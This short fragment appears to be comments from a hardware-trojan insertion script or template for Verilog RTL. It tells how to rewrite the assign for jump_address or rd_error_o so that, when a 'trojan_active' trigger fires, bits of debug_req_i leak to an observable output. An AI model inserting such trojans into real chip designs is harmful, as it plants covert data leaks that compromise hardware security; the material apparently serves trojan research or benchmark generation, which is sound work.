 ...
 * Payload: Route jump_address[0] to observable output
 * 
...
//   Find the assign for jump_address (or rd_error_o as fallback):
//     assign jump_address = <normal_expr>;
//   Replace with:
//     assign jump_address = trojan_active ? debug_req_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? debug_req_i[0] : 1'b0;
//
